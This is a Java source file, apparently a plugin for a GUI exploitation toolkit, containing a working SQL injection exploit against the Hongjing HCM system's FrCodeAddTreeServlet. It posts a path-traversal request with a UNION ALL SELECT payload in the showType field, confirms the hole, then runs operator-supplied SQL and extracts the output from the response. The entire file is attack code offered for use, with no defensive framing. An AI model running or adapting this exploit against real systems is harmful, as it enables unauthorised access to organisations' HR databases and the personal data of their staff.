package exp.oa.hongjingoa;

import core.Exploitlnterface;
import decrypt.code.getAllEncode;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class hongjing_hcm_FrCodeAddTreeServlet_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            String data = "params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1' UNION ALL SELECT 123,NULL,NULL,NULL,NULL,NULL-- fNwL&treetype=&orgtype=";
            Response res = HttpTools.post(url + "/templates/attestation/../../servlet/FrCodeAddTreeServlet",data, head, "utf-8");
            if (res.getText().contains("123")) {
                String target_req = url + "/templates/attestation/../../servlet/FrCodeAddTreeServlet";
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongjing_hcm_FrCodeAddTreeServlet_sqli ]");
                    textArea.appendText("\n (1) sql: sqlserver");
                    textArea.appendText("\n (2) 联合查询注入, CMD输入sql语句, eg: user_name()");
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            String data = "params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1' UNION ALL SELECT "+sql+",NULL,NULL,NULL,NULL,NULL-- fNwL&treetype=&orgtype=";
            Response res = HttpTools.post(url + "/templates/attestation/../../servlet/FrCodeAddTreeServlet",data, head, "utf-8");
            if (res.getText()!="" && res.getCode() == 200) {
                String var = res.getText();
                String var1 = var.substring(var.indexOf("TreeNode id=\"")+13,var.indexOf("\" text=\""));
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入成功");
                    textArea_cmd.appendText("\n" + var1);
                    textArea.appendText("\n ");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入失败");
                    textArea.appendText("\n ");
                });
                return false;
            }
        }catch (Exception E){
            return false;
        }
    }
}
